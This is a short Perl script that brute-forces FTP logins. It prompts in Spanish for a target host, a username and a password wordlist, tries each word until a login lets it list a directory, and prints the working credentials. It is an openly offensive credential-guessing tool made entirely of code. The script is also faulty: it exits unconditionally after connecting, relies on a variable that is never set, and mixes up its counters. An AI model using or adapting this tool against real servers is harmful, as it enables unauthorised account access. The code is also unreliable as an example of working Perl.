#!/usr/bin/perl
use Net::FTP;
# c0dex by m0x.lk
# m0x.lk@linuxmail.org
# RE & HaSe
# BrFTP .-
system ("clear");
system ("cls");
system ("color 72");
print "C0dex by m0x.lk\n";
print "\n";
print "BrFTP .- RE & HaSe\n";
print "\n";
sleep 1;
print "Target: ";
$target=<STDIN>;
print "\n\n";
print "User: ";
$user=<STDIN>;
print "\n\n";
print "Diccionario: ";
$dict=<STDIN>;
print "\n\n";
$counter=0;
$times=0;
print "Conectando $target\n";
print "\n";
$ftp = Net::FTP->new($target,Debug => 1);
die "Imposible resolver $target\n";
print "\n";
open (D,"<$dict") or die "Diccionario no encontrado\n";
while(<D>)
{
$try = $_;
    chomp $try;
    $ftp->login($user,$try);
    $counter++;
    $tiempo++;
    if($ftp->ls("."))
    {
	print "$user / $try \n";
	last;
    }
    if($counter==$fallos)
    {
print "\n\n";
	$ftp->quit;
	print "Volviendo a conectar $target";
	$ftp = Net::FTP->new($target,Debug => 1);
	die "Imposible conectar $target\n";
print "\n\n";
	$counter=0;
    }
}
close(D);
print "\n\n";
print "$tiempo Obtener pass";
print "\n\n";
print "c0dex by m0x.lk";

